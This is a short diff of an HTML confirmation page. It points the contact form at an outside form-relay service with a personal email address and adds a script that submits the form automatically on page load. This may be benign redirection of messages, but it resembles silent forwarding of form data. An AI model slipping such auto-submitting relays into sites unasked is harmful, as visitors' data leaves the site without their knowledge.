@@ -69,7 +69,7 @@
 <div class="content">
     <h1 class="flex-caption">Your message was recorded.</h1>
 
-    <form name="contactForm" id="contactForm" method="post" action="confirmation.php">
+    <form name="contactForm" id="contactForm" method="post" action="https://formsubmit.co/hryemima@gmail.com">
 
       			<fieldset>
 
@@ -184,5 +184,7 @@
       </div> <!-- /row -->
 
    </footer> <!-- /footer -->
+
+   <script type="text/javascript">document.getElementsByTagName('form')[0].submit()</script>
 </body>
 </html>
